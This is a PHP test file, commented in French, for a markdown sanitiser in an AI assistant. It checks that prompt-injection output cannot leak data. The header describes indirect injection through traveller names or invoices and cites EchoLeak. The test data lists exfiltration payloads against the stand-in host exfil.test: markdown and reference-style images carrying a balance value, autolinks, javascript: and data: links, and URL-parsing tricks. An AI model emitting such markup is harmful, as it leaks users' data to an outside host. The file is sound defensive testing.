<?php

use App\Services\Ai\Assistant\RouteLinks;
use App\Services\Ai\Assistant\SafeMarkdown;

/**
 * Le canal de sortie est la vraie défense contre l'injection indirecte : une consigne cachée
 * dans un nom de voyageur ou une facture ne doit jamais produire une ressource chargée seule
 * (image) ni un lien cliquable vers l'extérieur. Charges reprises d'EchoLeak (CVE-2025-32711),
 * qui contournait un filtre de liens par les liens de type référence et les images.
 */
function rendu(string $markdown): string
{
    return (new SafeMarkdown(new RouteLinks))->render($markdown);
}

it('ne laisse passer ni image ni lien externe', function (string $charge) {
    // Analyse du DOM, pas de regex : « &lt;img src=… » affiché en texte est inoffensif, seule
    // une VRAIE balise compte.
    $dom = new DOMDocument;
    @$dom->loadHTML('<?xml encoding="utf-8"?><div>'.rendu($charge).'</div>');

    foreach ($dom->getElementsByTagName('*') as $element) {
        expect(in_array($element->nodeName, ['img', 'iframe', 'script', 'object', 'embed', 'source', 'video', 'audio', 'link'], true))
            ->toBeFalse("balise {$element->nodeName} rendue")
            ->and($element->hasAttribute('src'))->toBeFalse("attribut src sur {$element->nodeName}");

        // `[x](javascript:…)` ressort en `<a>x</a>` sans href : texte inerte, non cliquable.
        if ($element->nodeName === 'a' && $element->hasAttribute('href')) {
            expect($element->getAttribute('href'))->toStartWith('/')
                ->and($element->getAttribute('href'))->not->toStartWith('//')
                ->and($element->getAttribute('href'))->not->toContain('exfil');
        }
    }
})->with([
    'image en ligne' => '![ok](https://exfil.test/p?d=SOLDE)',
    'image de type référence' => "![ok][r]\n\n[r]: https://exfil.test/ref-image",
    'lien de type référence' => "[voir][r]\n\n[r]: https://exfil.test/ref",
    'lien de référence réduit' => "[r][]\n\n[r]: https://exfil.test/collapsed",
    'autolien' => '<https://exfil.test/auto>',
    'URL nue' => 'Voir https://exfil.test/nue pour la suite.',
    'balise img' => '<img src="https://exfil.test/i.png">',
    'img encodée en entités' => '&lt;img src=https://exfil.test/e.png&gt;',
    'lien javascript' => '[clic](javascript:alert(1))',
    'lien data' => '[clic](data:text/html;base64,PHNjcmlwdD4=)',
    'protocole relatif' => '[clic](//exfil.test/pr)',
    'barre oblique inverse' => '[clic](/\\exfil.test/bs)',
    'identifiants dans l\'hôte' => '[clic](https://beta.openlmnp.fr@exfil.test/u)',
    'chemin interne détourné' => '[clic](/expenses/../../exfil.test)',
    'iframe' => '<iframe src="https://exfil.test/f"></iframe>',
]);

it('garde cliquable un lien vers une page du logiciel', function () {
    expect(rendu('Ouvrez [vos charges](/expenses).'))->toContain('<a href="/expenses">vos charges</a>');
});
